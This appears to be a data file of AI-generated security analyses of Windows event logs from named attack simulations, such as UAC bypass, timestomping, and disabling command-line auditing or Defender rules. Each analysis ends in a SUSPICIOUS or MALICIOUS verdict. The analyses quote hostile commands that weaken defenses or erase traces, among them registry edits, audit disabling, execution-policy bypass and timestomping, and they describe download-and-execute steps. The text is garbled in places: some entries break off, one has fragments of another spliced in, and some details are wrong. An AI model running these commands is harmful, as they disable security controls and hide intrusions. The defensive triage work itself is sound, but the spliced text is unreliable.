   - Consider restoring affected services or files to a known clean state.

4. **Patch and Update**:
   - Confirm that all systems, especially those with administrative processes, are up-to-date with patches and antivirus definitions.
   
5. **Security Hardening**:
   - Audit and adjust PowerShell logging to capture more detailed command-line activities in the future.
   - Reinforce policy around script execution and administrative access, potentially leveraging application whitelisting to better control executable permissions and origins.

By decisively responding to these indicators, we aim to mitigate potential threats and reinforce the company's security posture against similar vulnerabilities."
Event Viewer Registry Modification - Redirection Program,"The provided logs include events from Sysmon, Security, Application, and System logs. Based on the available entries, here are the observations and analysis:

### Sysmon Log Analysis
1. **Multiple Executions of System Utilities**: Logs show multiple executions of processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe`. While these are legitimate Windows processes, their repetitive execution in a short period can be suspicious if not attributed to known administrative tasks.

2. **Command Prompt (cmd.exe) Execution**:
   - `cmd.exe` is executed with a command that modifies the registry: 
     ```
     cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""C:\windows\system32\notepad.exe"" /f
     ```
   - This command line indicates an attempt to alter registry settings. It's a potential red flag for persistence or evasion tactics, especially when combined with seemingly benign tools like `notepad.exe`.

3. **Process Integrity Levels** and User**: All flagged processes are executed under `SERVER002\admin_test` with **High** integrity, indicating elevated privileges, which is especially risky for `cmd.exe` and `reg.exe`.

### Security Log Analysis
1. **Login Events**:
   - There are login events (`EventID 4624`) for `admin_test` from `DESKTOP-3HL5B2P` using NTLM authentication.
   - Elevated privileges (`EventID 4672`) were obtained by `admin_test`, allowing them to perform tasks typically reserved for privileged accounts (e.g., `SeDebugPrivilege`).

2. **Time Change**:
   - `EventID 4616` indicates a system time change by `svchost.exe`, which can signify a tactic used to disrupt event log timelines - though requires corroborative evidence.

### Application Log Analysis
- Minimal entries with no direct indicators of malicious activity, typical entries related to the operation of the Software Protection Platform.

### System Log Analysis
- Time synchronization events noted as standard operations via `time.windows.com`, potentially unrelated to suspicious activity unless corroborated with other anomalies.

### Conclusion and Resolution
Based on the logs:

- **The execution of registry modification commands from `cmd.exe` without context of known administrative activity is highly suspicious**.
- **The repetitive execution of Windows system utilities like `wevtutil.exe` and `conhost.exe` could indicate script-based execution or automated task, commonly used in lateral movement techniques**.
- **The change in system time (EventID 4616) done close to this activity is another red flag for different potentially linked malicious activity**.

Given these findings, **the events are best classified as SUSPICIOUS**. Further investigation, including checking the source of commands, purpose behind the registry modification, and whether these actions align with typical administrative activities (via change management logs or user confirmation), is needed to accurately ascertain whether this activity is indeed malicious. "
UACME Bypass Method 34,"Upon reviewing the provided Windows event logs, I have performed an analysis focusing on indicators of compromise such as suspicious process executions, anomalous command-line arguments, and potential privilege escalations. Below is a detailed assessment:

### Suspicious or Anomalous Behavior Identified:
1. **CMD Execution with Unusual Command-Line Arguments:**
   - EventID 1 in the Sysmon log shows the execution of `C:\Windows\System32\cmd.exe` with command-line arguments pointing to an unusual path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\34 Akagi64.exe`. The file `34 Akagi64.exe` may be potentially suspicious due to its execution from a temporary directory and could indicate an attempt to execute external scripts.

2. **Repetitive Usage of System Utilities:**
   - We see frequent execution of `wevtutil.exe` (Windows Event Log Utility) and `conhost.exe` (Console Host). While these utilities are part of legitimate system processes, their repetitive and scheduled manner could indicate attempts to view, modify, or clear Windows event logs, potentially masking illicit activities.

3. **High-Level Integrity Execution:**
   - The mentioned processes such as `cmd.exe`, `whoami.exe`, and `HOSTNAME.EXE`, among others, have an integrity level of ""High"", which means they are running with elevated privileges. This could be part of normal operations; however, the context, primarily how these commands with high privileges interact with the `Akagi64.exe`, raises concerns.

4. **Edge Update Activities:**
   - There is a substantial amount of activity related to Microsoft Edge Update processes executed under `NT AUTHORITY\SYSTEM`. While such activities themselves may appear normal as part of update operations, their volume and frequency suggest a deeper look may be warranted to ensure it's not being utilized as a mechanism for persistence or launching other operations.

5. **Command `whoami.exe` Executions:**
   - There is a log entry for the execution of `whoami.exe`, which is often used to check the current user's context. If unnecessary, this execution in sequence with other activities, including `cmd.exe` and external executables, may suggest privilege verification or exploration by a script or individual.

### Assessment:
- **Analysis of the Akagi64.exe Execution:**
   - This is a critical flag due to running in a temporary location combined with the extracted path construct via cmd.exe to execute a potentially malicious executable. Akagi64.exe might be leveraged through known DLL hijacking techniques or similar abuse tactics.

### Recommendations & Resolution:
1. **Immediate Threat Assessment for `Akagi64.exe`:**
   - This executable needs to be further investigated. Check its hash and the signature for known malicious characteristics. Search threat intelligence databases for similar patterns or known hashes.

2. **Investigating Edge Update Logs:**
   - Review whether the excessive Edge-related process execution aligns with corporate update schedules or routines. Anomalies might indicate an abuse of Edge Update as a legitimate process for unauthorized persistence.

3. **System and Files Integrity Check:**
   - Perform integrity checks and review recent changes to system files. Ensure all logs are intact and not manipulated.

4. **Network Traffic Analysis:**
   - Look for any unusual outbound connections corresponding in timing with these file executions, especially from admin_test's user context.

5. **User Role Evaluation:**
   - Validate the activities under the user account `SERVER002\admin_test` to ensure it aligns with legitimate administrative activities. Consider reviewing login patterns and access methods.

### Conclusion:
Given the findings, particularly the concerning execution of `Akagi64.exe`, I rate the logs as **SUSPICIOUS**. These activities suggest more investigation is needed to determine if these are signs of malicious activity or legitimate operations potentially carrying misconfigurations or misuse. Immediate detailed scrutiny and containment measures should be employed where needed, focusing on the involved executables and user activities."
Execution of program.exe as service with unquoted service path,"Upon reviewing the provided Windows event logs from the Security, PowerShell, Application, Sysmon, and System log categories, I have identified several key points which suggest potentially malicious activity. Here is the detailed analysis:

### Key observations:
1. **Security Log Entries (Event ID 4616)**:
   - The entries here show a system time change, initiated by `svchost.exe` under the `LOCAL SERVICE` account. While this can be legitimate, unauthorized or unexpected time changes should be investigated as they can be used to evade detection mechanisms based on time.

2. **Sysmon Log Entries**:
   - **Process Creation and Execution**:
     - Several instances of `wevtutil.exe` and `conhost.exe` are seen running under the `SERVER002\admin_test` user. These are common system utilities, but their frequency and initiation by a user account rather than a system account could suggest process monitoring or tampering.
   
   - **Creation of a New Service**:
     - A suspicious execution of `cmd.exe` is observed which includes the creation of a new Windows service named ""Example Service"" using `sc.exe`. This new service launches an executable, `windows_service.exe`, located in `C:\Program Files\`, which has two suspiciously redundant copies being made in the command (`COPY` used twice).

   - **Command Execution with High Integrity**:
     - The user `SERVER002\admin_test` is executing commands with high integrity, indicating elevated privileges, which could potentially be indicative of unauthorized usage or privilege escalation attempts.

3. **System Log Entries**:
   - **New Service Registration**:
     - Service Control Manager (SCM) logs indicate the registration of ""Example Service"" configured to auto-start with the image path `C:\Program Files\windows_service.exe`. This service is attributed to the `LocalSystem` account, which is typically how persistent and high-privileged malicious activities are conducted.
     - The immediate failure of the Example Service (`EventID 7000`) may indicate a misconfiguration or hastily performed action which didn't include normal testing or was improperly constructed – often characteristic of attackers under time constraints.

### Assessment:
Considering the above observations, particularly the creation of a potentially unauthorized service and the execution of commands related to it, the logs demonstrate signs of malicious activities.

- **Indicators of Compromise**:
  - New unauthorized service creation via `sc.exe`.
  - Execution of system utilities potentially being used for persistence or evasion.
  - High privilege commands executed by a likely non-standard user account `admin_test`.

### Resolution:
- **Resolution: MALICIOUS**
  - The detected activities strongly indicate malicious intent, potentially involving unauthorized persistent backdoors through service creation and possibly indicating initial stages of more severe exploitation or lateral movement.

### Guidance:
1. **Immediate Actions**:
   - Disable and remove the suspicious ""Example Service"" if not recognized as legitimate by authorized personnel.
   - Perform a comprehensive review of user account activities, especially `admin_test`.
   - Scan the system for other unauthorized services or shadow copies of files.

2. **Forensic Investigation**:
   - Collect additional logs around the time of these events, including network logs, to identify ingress paths.
   - Examine the copied binaries (`windows_service.exe` and `program.exe`) for malicious content.
   - Seek any related indicators of compromise (IoCs) in adjacent systems and segments.

3. **Enhanced Monitoring**:
   - Increase logging and monitoring on key critical systems.
   - Implement alerting on similar suspicious behaviors, such as unexpected process creations or time changes.

The above steps will not only address the detected threats but also strengthen the overall security posture of the environment."
Kill Event Log Service Threads,"Based on the provided Windows event logs, I have conducted a detailed analysis, and here's the summary of findings:

1. **System Log**:
   - The events show normal time updates and changes initiated by `svchost.exe`, which is typically part of legitimate Windows operations managing service hosting. These events alone do not indicate malicious activity.

2. **Sysmon Log**:
   - The log shows several executions of common system utilities like `wevtutil.exe`, `conhost.exe`, and `hostname.exe` under the user ""SERVER002\\admin_test"".
   - `whoami.exe` was executed, displaying logged-on user information. This is not suspicious by itself.
   - An especially concerning entry is the execution of `powershell.exe` with a command to set the execution policy to RemoteSigned and download a script from the internet, with a subsequent import and execution of the script (`script.ps1`) from a URL on GitHub. This activity indicates that a potentially malicious script was downloaded and executed without restriction, which is a known tactic used in various attacks for malicious payload delivery.

3. **Windows PowerShell Log**:
   - The logs reaffirm the execution of a PowerShell command to change the execution policy and download a script from an external URL, which is commonly seen in malicious activities aimed at running unauthorized code.

4. **Security Log**:
   - The logs contain typical logon events and privilege assignments. User ""admin_test"" was granted extensive privileges. While having a user with administrative rights is not inherently malicious, when combined with the PowerShell activities, this raises concerns, given the potential for misuse of privileges.

5. **Application Log**:
   - Windows Defender is reported as active, which shows no disabling events occurring. However, given the PowerShell activity, it’s possible that the Defender may not have detected the malicious script, or the security product's state might have been altered temporarily during the attack.

### Conclusion:

- **Suspicious Activity Identified**: The PowerShell execution to download and run a script from an external URL suggests potentially malicious behavior. This type of activity is often associated with script-based attacks or initial access in larger attack chains.

### Resolution: **MALICIOUS**

### Recommendations:
1. **Immediate Investigation**:
   - Isolate the system (Server002) for further offline forensic analysis to prevent potential data exfiltration or lateral movement.
   - Check for the existence of the downloaded script (`script.ps1`) and any changes it might have made on the system.
   - Investigate ""admin_test"" user activity to understand if credentials have been compromised and if malicious commands were intentionally executed.

2. **Mitigation Steps**:
   - Change all relevant administrative passwords as a precaution against compromise.
   - Implement stricter PowerShell execution policies and conduct network monitoring for unusual external connections.
   - Review and potentially enhance the scope of security products to ensure scripts from unauthorized URLs are effectively blocked.

3. **Further Monitoring**:
   - Monitor for any recurring PowerShell scripts or similar suspicious activities across other network systems.
   - Conduct a thorough review of system logs across the network to determine if additional systems have been targeted.

By executing these recommendations, you can begin to mitigate the impact and investigate the scope of the malicious activity detected within these logs."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"Upon reviewing the provided logs, the following points of interest were noted:

1. **Sysmon Log Analysis**:
   - There are several instances of PowerShell execution. The specific command used (`powershell.exe -nop -Command Write-Host CustomAction export executed me; exit`) suggests an attempt to execute a script without profile loading (`-nop` stands for No Profile), which is often seen in malicious scripts attempting to avoid detection.
   - Multiple instances of `conhost.exe` linked with various processes are observed, which in itself is not inherently suspicious but warrants further investigation if connected with other anomalous activities.
   - The command `cmd.exe /c c:\\windows\\system32\\msiexec.exe /q /i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi""` indicates a silent installation (`/q` for quiet mode) from a temporary directory, which could be suspicious if the MSI file is not recognized or verified to be legitimate software.

2. **Security Log Analysis**:
   - Event ID 4672 indicates the assignment of special privileges to the account SYSTEM for various security-sensitive operations, which might not be unusual, but worth noting if linked with other suspicious activities.

3. **Application Log Analysis**:
   - The installation of `data.007_DLL.msi` was logged, and it completed successfully. However, the source and legitimacy of this MSI need verification due to the context (execution from a temp folder).
   - Microsoft's Edge Update process (`MicrosoftEdgeUpdate.exe`) is seen running multiple processes, which is typical for update checks and installations but should be confirmed as part of scheduled or expected activity.

4. **Powershell Log Analysis**:
   - The PowerShell task with the `-nop` flag indicates an activity that could potentially bypass profile scripts, often seen in malicious or suspicious activities.

### Assessment & Conclusion

**Assessment**: The logs exhibit several processes that could be deemed suspicious based on their command-line arguments, origin of execution (e.g., temp folder), and nature (e.g., PowerShell with `-nop`). The execution of MSI files from non-standard locations and the invocation of PowerShell without profile alongside `Write-Host` commands suggest potentially unwanted or malicious activities.

**Resolution**: **SUSPICIOUS** - These logs contain indicators that suggest potentially suspicious activity. While there is no definitive proof of malicious intent, the context and behavior of the processes warrant further investigation to rule out any potential compromise.

### Guidance on How to Proceed:
- **Investigate the Source**: Verify the source and legitimacy of the MSI files being executed, particularly from temporary directories.
- **Analyze Scripts**: Obtain any scripts related to the PowerShell commands executed and review their contents for suspicious or malicious actions.
- **Audit Logons and Privileges**: Confirm that system process logons and privilege escalations align with expected administrative actions and do not show unauthorized usage.
- **Perform a Malware Scan**: Conduct a comprehensive malware scan on the host to detect any present threats.
- **Implement Monitoring**: Set up enhanced monitoring, particularly for processes launched with suspicious flags or from unconventional directories, to detect and respond to potentially malicious behavior promptly."
Mshta Executes Remote HTML Application (HTA),"After carefully reviewing the Windows Event Logs provided, the following analysis identifies indicators of potentially malicious activity:

### Analysis Summary:

#### Windows PowerShell Log
- **Suspicious PowerShell Execution**: 
  - The logs repeatedly show a PowerShell command involving the use of `Invoke-WebRequest` to download an `.hta` file from what appears to be a non-trusted source (`https://raw.githubusercontent.com`). This file is then executed using `mshta.exe`, which is often used in malicious activities to bypass security mechanisms.
  - The script also attempts to add the downloaded file to the startup folder (`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\data.005.hta`), which indicates persistence intent.
  - The script then attempts to stop the calculator process, which may be a tactic to hide malicious activity or interfere with legitimate system operations.

#### Sysmon Log
- **Execution of Mshta.exe**:

Windows - Modify file last access timestamp with PowerShell,"### Analysis:

Upon reviewing the provided Windows event logs, several areas of concern are noted, pointing towards potentially malicious activity:

1. **PowerShell Logs**:
   - Multiple entries show the use of a PowerShell script command attempting to modify the last access time of a file (`data.006_timestomp.txt`) located in a suspicious path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\`). The command executed is as follows:
     ```
     powershell.exe & {Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt"" | % { $_.LastAccessTime = ""01/01/1970 00:00:00"" }}
     ```
   - This action can be interpreted as timestomping, a technique often used by attackers to manipulate file timestamps, potentially to hide unauthorized modifications or deletions.

2. **Sysmon Logs**:
   - The Sysmon logs reveal repeated executions of `wevtutil.exe` and `conhost.exe` initiated by the user `SERVER002\admin_test`. The `wevtutil.exe` utility is commonly associated with reading or clearing Windows event logs, a potential indicator of log tampering or cleaning efforts post-compromise.
   - The presence of multiple conhost sessions is not inherently suspicious but, in combination with the timestomping activity, it's part of a pattern of suspicious behavior.

3. **Process Activity**:
   - The execution of `whoami.exe` and `hostname.exe` under the same user within the same timeframe could be part of ordinary administrative tasks, but given the context, they could also indicate reconnaissance efforts, trying to learn about the system environment and user context.

### Conclusion:

The logs indicate potentially malicious activity, characterized by:
- The use of timestomping on a file, indicating attempts to obfuscate actions.
- Concurrent execution of system utilities possibly used to erase event logs or perform system reconnaissance.
- All activities are performed under a user account `admin_test`, which suggests that the account may be compromised.

### Guidance on How to Proceed:

1. **Resolution: MALICIOUS**
   - The observed activity aligns with known malicious techniques used to conceal unauthorized modifications and compromise activities.
   
2. **Immediate Actions**:
   - Isolate the affected host (Server002) from the network to prevent further spread or exfiltration.
   - Conduct a thorough analysis of the `admin_test` account to determine if it has been compromised—consider resetting credentials.
   - Examine the file `data.006_timestomp.txt` for any malicious payload.
   - Review other hosts in the network for similar indicators of compromise.

3. **Remediation Steps**:
   - Implement host-based and network-wide threat detection and prevention systems to alert on similar activities.
   - Educate staff on secure PowerShell scripting practices and how to spot unauthorized script executions.

However, frequent or unexplained time changes, particularly involving svchost.exe, can indicate an attempt to manipulate timestamps on a potentially compromised system.

2. **Privilege Use:**
   - EventID `4672` shows that the `admin_test` account was granted a number of privileges typical for administrative tasks, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are sensitive and potentially dangerous if abused by a malicious user or process.

3. **Reg.exe Execution:**
   - In the Sysmon log, event `18005` and `18007` show the execution of `reg.exe` to modify registry keys related to Windows Defender (`DisableEnhancedNotifications`). This action is suspicious because disabling or tampering with security tools is a common tactic used by malware to avoid detection.

4. **Command Execution Activity:**
   - The execution of `cmd.exe` in event `18009` with a command that modifies registry settings without apparent legitimate purpose could suggest malicious intent to weaken the security posture of the affected host.

5. **External Connections:**
   - EventID `4624` from the security log indicates a network logon (Logon Type `3`) using the NTLM authentication protocol, with a workstation name `DESKTOP-3HL5B2P`. If this was unexpected or not a common occurrence for `admin_test`, it could suggest unauthorized access.

6. **Frequent Use of Administrative Tools:**
   - The logs show numerous executions of administrative tools like `wevtutil.exe`, `host.exe`, and `whoami.exe`. While usage of these tools can be normal depending on user activities, their frequent use in rapid succession suggests potential script-based automation of tasks, often seen in attacks.

### Conclusion

Based on the above observations, the logs contain several entries that are suspicious and possibly indicative of malicious activity. These include unauthorized modifications to security settings, time manipulation, and a series of administrative and command-line tool executions commonly used in post-exploitation activities.

### Resolution: SUSPICIOUS

The logs contain activity that does not seem right and requires further investigation. The next steps would include:
- Verifying the purpose and context of the time changes.
- Reviewing the timeline of privilege use and any scripts or tasks executed.
- Checking for any unauthorized logons or connections from external machines.
- Examining the system for any known indicators of compromise (IOCs) related to registry and Windows service manipulations.

4. **High Integrity Level Executions:**
   - The processes running with high integrity levels, like `whoami.exe` and `hostname.exe`, especially under a user context that has been assigned privileged rights (like `SeDebugPrivilege`), are normal in some contexts but require validation to ensure they’re part of expected administrative tasks.

### Indicators of Malicious Activity:

- The registry edit by `cmd.exe` stands out as particularly concerning, especially when combined with the high integrity level and privilege held by the user. In many cases, this is a sign of an attempt to weaken security controls on the system or persist across reboots.
  
- The sequence and frequency of process executions, especially concerning `wevtutil.exe`, could indicate attempts to manipulate or hide information in the event logs.

### Assessment and Resolution:

Based on the above observations, while there are legitimate explanations for some of the activities (e.g., system updates), the combination of registry modification, time manipulation, and privileged use of native tools suggests potentially malicious behavior.

### Resolution:

**MALICIOUS** - The presence of unauthorized registry alterations combined with backdating the system time indicates possible malicious intent or unauthorized administrative activity.

### Guidance:

- **Immediate Action:**
  1. Conduct further investigation to confirm the legitimacy of the registry change. Check recent changes in group policies or user permissions that might explain these actions.
  2. Verify the source and context of the privileged user sessions logged as `admin_test`. Determine if this was legitimate activity by an authorized administrator.
  3. Review the execution context and frequency of tools like `wevtutil.exe` and `conhost.exe` to further assess their appropriateness.

- **Containment and Remediation:**
  1. Consider isolating the system from the network if further investigation highlights continued unauthorized activity.
  2. Restore any unauthorized registry changes to their previous state and strengthen policies around registry access.
  3. Conduct a full malware and threat scan to identify any further indicators of compromise.

- **Monitoring and Prevention:**
  1. Enhance logging and monitoring of critical infrastructure and administrative operations.
  2. Implement more stringent privilege management and audit logs for changes to sensitive settings.
  
By taking these steps, the risk from the indicated malicious behavior can be mitigated effectively."
Launches an executable using Rundll32 and pcwutl.dll,"After analyzing the provided logs, the following observations and assessments can be made:

1. **Time Changes**: The system log shows entries indicating time changes conducted by `svchost.exe`. Such changes are usually normal, especially when time synchronization occurs. However, the proximity and rapid succession of time changes (Event IDs 24 and 1 from the Kernel-General provider) might indicate a more peculiar behavior, possibly related to attempts of evading detection.

2. **PowerShell Logs**: PowerShell logs were anticipated but seem to be missing from the log data provided, which does not help in identifying potentially script-based malicious activities.

3. **Process Activity**: In the Sysmon logs, there are several process creation events related to `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `notepad.exe`. Of note:
   - `cmd.exe` is executing a command with `rundll32.exe` to launch `notepad.exe`, which can be considered suspicious since `rundll32.exe` is occasionally used for executing malicious DLLs, although the direct execution of Notepad itself is often benign.
   - Frequent creation of `wevtutil.exe` and `conhost.exe` processes by the user `admin_test`. While the purpose of these executions is unclear from the logs alone, the frequency and nature warrant further investigation.

4. **Privilege Escalations**:
   - A logon event shows the use of NTLM authentication with elevated privileges (`SeDebugPrivilege`, among others) for the user `admin_test`, which can be potentially risky if done without proper oversight.

5. **Edge Update Activity**: There are logs detailing updates related to Microsoft Edge. The activities appear regular, such as service stops, updates, and COM registrations, and do not evidence direct malicious behavior.

6. **Summary and Resolution**:
   - The actions recorded in the logs do not provide clear evidence of malicious activity but do present some indications (frequent use of `wevtutil` and `rundll32` with `cmd.exe` by `admin_test`) that could warrant further monitoring and investigation.
   - The elevated privileges granted for certain logon sessions could pose a risk if not deliberate or supervised.

**Resolution: SUSPICIOUS**

**Guidance**:
- Investigate the rationale behind the frequent system utility usage (`wevtutil.exe`, `conhost.exe`) by `admin_test` and validate that these actions were legitimate administrative activities.
- Actively monitor any further use of `rundll32.exe` and associated scripts to ensure they are benign.
- Review time change activities for anomalies and verify synchronization configuration.
- Ensure strict access control and monitoring of elevated privilege access to mitigate potential misuse."
Delete Microsoft Defender ASR Rules - InTune,"After analyzing the provided Windows event logs, several observations can be noted.

### System Logs
- The time change event (`EventID 1` and `EventID 24`) suggests that the system time was adjusted. Such adjustments, particularly if unexpected, can be indicative of attempts to manipulate log timestamps. However, in this instance, it might also be part of a legitimate system time synchronization event as indicated by time source selection in `EventID 35`.

### Sysmon Logs
- The execution of `svchost.exe` and other legitimate system processes like `wevtutil.exe` and `conhost.exe` under NT AUTHORITY\SYSTEM or SERVER002\admin_test can be typical background activity. However, the use of `wevtutil.exe` can be potentially malicious if associated with log clearing or modifications, though no explicit evidence of such actions was found in these logs.
- The execution of `powershell.exe` with a suspicious command-line argument modifying registry values (`ASRRules`) in the Windows Defender Policy Manager is concerning. Altering the registry can be indicative of an attempt to disable security features or evade detection mechanisms.

### PowerShell Logs
- Repeated PowerShell activity involving suspicious registry modifications as mentioned above can suggest malicious intent, particularly if this behavior is not standard for the observed user or system activity. These events align with PowerShell `EventID 600`.

### Application Logs
- Multiple events indicating the starting or stopping of the `edgeupdate` service, which might relate to legitimate browser update processes.

### Security Logs
- User `SERVER002\admin_test` gains a range of powerful privileges, including `SeDebugPrivilege`, typically an indication of high-level access which can be leveraged for malicious activity if not properly regulated. This corresponds with `EventID 4672`.
- There are multiple logon (`EventID 4624`) and logoff (`EventID 4634`) events related to the user `admin_test`, which could indicate normal administrative activities or attempts to mask actions.

### Findings and Resolution
Given the presence of PowerShell activity that modifies registry settings related to the Windows Defender policies, the presence of high-privilege assignments, and potential time-stamp manipulation, there are indicators that could suggest malicious activity. However, some activities could also align with legitimate administrative or maintenance activities, depending on the context of this server's use.

**Resolution: SUSPICIOUS**

This conclusion suggests that while there is no definitive evidence of malicious activity, the activities observed, particularly the modification of security-related registry entries and privilege escalations, warrant further investigation. It is recommended to:
- Confirm whether these activities are part of scheduled tasks or maintenance procedures.
- Review any additional context around `admin_test` activities.
- Ensure that antivirus or EDR solutions are operating effectively on the system.
- Audit any changes made to security policies to verify they were authorized."
Disable Windows Command Line Auditing using Powershell Cmdlet,"Upon a detailed analysis of the provided event logs for the Windows host, several elements suggest potential suspicious activities that might point toward malicious behavior. Here's the comprehensive breakdown:

### Evaluation of Log Entries:

1. **Time Change Logs**:
   - In the Security and System logs, Event IDs 4616 and 1 indicate time changes made by the system. While time syncs are normal, frequent and short time discrepancies (NewTime being earlier than PreviousTime) can sometimes be manipulated during attacks to obfuscate event timelines.
   
2. **PowerShell Execution (Suspicious Command)**:
   - The Sysmon logs (\`EventID 1\`) and PowerShell logs show a PowerShell command executed that modifies the registry key for enabling process creation audit. The command line:
     ```
     ""powershell.exe"" & {New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore}
     ```
   - This command disables the logging of command lines in process creation events which is a common tactic used by attackers to evade defenses.

3. **Process Executions and Process Tree**:
   - The logs reveal multiple executions of \`wevtutil.exe\`, \`conhost.exe\`, and usage of high-integrity PowerShell sessions by the user \`SERVER002\\admin_test\`. 
   - Certain process executions, such as \`C:\\Windows\\System32\\whoami.exe\` and \`conhost.exe\`, are not inherently malicious but are commonly used during reconnaissance.

4. **Microsoft Edge Update Processes**:
   - Numerous \`MicrosoftEdgeUpdate.exe\` processes and related activities (\`dbf410b3-\`) are noted as running under \`NT AUTHORITY\\SYSTEM\` and involve legitimate update tasks.
   - Although numerous, they appear consistent with routine update mechanisms for Microsoft Edge.

### Assessment & Conclusion:

- **Anomalous Behavior**: The execution of the PowerShell command to disable command-line auditing is highly suspicious. This specific action is commonly associated with attempts to cover tracks or prepare the system for further exploitation without easy detection.
  
- **Recommendation**:
  - Conduct a full forensic analysis on the machine focusing on PowerShell activity and registry changes.
  - Review recent user activities, especially concerning the `admin_test` account.
  - Ensure system and administrative policies enforce logging audit configurations.
  - Increase monitoring sensitivity for any similar PowerShell execution activities.

### Final Resolution: **SUSPICIOUS**

The activities outlined—especially the PowerShell execution disabling command line logging—warrant additional investigation to confirm whether malicious activities are occurring or have occurred. Further analysis should be conducted before making a final determination of compromise."
Disable Remote Desktop Anti-Alias Setting Through Registry,"Upon analysis of the provided Sysmon logs, the following observations can be made:

### Suspicious Patterns:

1. **Command Execution:** 
   - The execution of `cmd.exe` with the command line `/c reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 1 /f` is noteworthy. This command modifies the Windows Registry, specifically affecting Terminal Services settings. Such changes can indicate an attempt to alter remote desktop configurations, possibly for enabling or modifying remote access, which could be a stealthy move by an attacker.

2. **Frequent Execution of Utility Tools:**
   - There are numerous instances of execution of tools like `whoami.exe`, `wevtutil.exe`, and `hostname.exe`. While these might be normal administrative activities, the frequency and clustering of these executions could also indicate an attacker gathering system information or clearing logs.

3. **Integrity Level and User Context:**
   - All suspicious activities are executed under high integrity level and the `SERVER002\admin_test` user context. This user has significant privileges, implying that if this account is compromised, it could lead to serious repercussions.

### Normal / Benign Patterns:

- The presence and execution of processes such as `conhost.exe` and `svchost.exe` are typical for Windows operations. However, their parent relationships and command lines were consistently linked to administrative and maintenance operations, which could be aligned with either legitimate administrative scripts or reconnaissance/sustained access attacks.

### Conclusion:

- Based on the logs, there is clear evidence of a registry modification aimed at altering Terminal Services settings using a high-privilege account. This type of modification, especially without corresponding legitimate changes or approvals from authorized IT personnel, might indicate an attempt to facilitate unauthorized access or persistence.

- The frequent running of system information and log management tools suggests a potential reconnaissance and anti-forensics attempt by a malicious actor.

### Resolution:

- **SUSPICIOUS**

### Next Steps and Guidance:

1. **Verify the Legitimacy:**
   - Confirm whether the registry modification was part of a legitimate IT operation or change management process.
   - Review the associated user account `admin_test` for unusual activity or signs of compromise (e.g., password reset, multi-factor authentication enforcement).

2. **Conduct Comprehensive Audit:**
   - Perform a thorough review of other logs to uncover additional related activities or compromised systems.
   - Increase the monitoring of critical systems for similar high-integrity activities.

3. **Enhanced Monitoring and Security Controls:**
   - Implement additional monitoring and alerting on registry changes, especially those related to remote desktop services.
   - Assess and possibly implement security hardening measures for remote access services and accounts with administrative privileges.

4. **Incident Response Plan:**
   - If unauthorized activities are confirmed, escalate to the incident response team to contain and remediate potential compromises.
   - Validate the integrity of system logs and consider forensic measures if a breach is suspected."
Change Powershell Execution Policy to Bypass,"### Detailed Analysis of the Logs

#### Sysmon Logs
1. **Multiple Processes Execution:**
   - There is a repeated pattern of `wevtutil.exe` and `conhost.exe` processes executed multiple times.
   - `wevtutil.exe` is a legitimate Windows utility used to read and manage Windows event logs, and `conhost.exe` is a legitimate Windows console host process. Both executed by the user `SERVER002\admin_test`.

2. **PowerShell Execution:**
   - `powershell.exe` was executed with the command line `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine`.
   - This can be a sign of potentially malicious behavior as it is used to bypass the execution policy, allowing scripts to run that might be otherwise restricted.

3. **Utilities Usage:**
   - `HOSTNAME.EXE` and `whoami.exe` were run, which are typical utilities used for diagnostic purposes.

4. **Edge Update and Services:**
   - Numerous executions related to `MicrosoftEdgeUpdate.exe`, which appears legitimate for Microsoft Edge updates and has `NT AUTHORITY\SYSTEM` as the user indicating high integrity level tasks.
   - The command lines associated with `MicrosoftEdgeUpdate.exe` appear routine as part of update and registration processes.

5. **svchost.exe:** 
   - There are several executions of `svchost.exe`. This service hosts Windows services and runs various system tasks.

#### Security and System Logs
- **Time Change Event:**
  - The system time was adjusted. This could be part of normal time synchronization processes within the network.

#### Application and Windows PowerShell Logs
- **PowerShell Activity:**
  - The execution policy bypass and associated activities like alias and environment operations suggest administrative actions were performed.

### Assessment
- The executions of `wevtutil.exe`, `conhost.exe`, and `powershell.exe` with bypass suggest actions typical of both legitimate administrative tasks and potentially malicious activities such as log tampering or persistence threats. PowerShell's bypass of execution policy is a known tactic in penetration testing and malware deployment.
- The Microsoft Edge Update operations appear legitimate and are supported by activity occurring in associated logs, like the Application Log, showing routine service stops.

### Conclusion and Recommendation
Based on the log analysis, we observe:
- The PowerShell execution policy change is particularly suspect if not aligned with expected administrative behavior.
- The rest of the activity seems routine, associated with system updates and administrative queries.

**Resolution: SUSPICIOUS**

To proceed:
1. Confirm with the system administrator or IT team whether the PowerShell script execution and the execution policy modification were legitimate operations.
2. Implement continuous monitoring for unexpected use of scripts or command execution, especially those bypassing execution policies.
3. Review other security events and user activity logs for additional context around the actions performed by `SERVER002\admin_test`."
Create and start Hyper-V virtual machine,"After a comprehensive analysis of the provided Windows event logs from the PowerShell, System, Security, Sysmon, and Application channels, the following observations and conclusions can be drawn:

### Observations:

1. **PowerShell Log Events:**
   - There are a series of PowerShell log entries showing the creation of a virtual machine using a command sequence:
     ```powershell
     $VM = ""file VM""
     New-VM -Name $VM -Generation 2
     Set-VMFirmware $VM -EnableSecureBoot Off
     Start-VM $VM
     ```
   - This PowerShell activity is executed by the user `SERVER002\admin_test` with high integrity, which is typical for administrative tasks involving virtual machines.

2. **System and Security Log Events:**
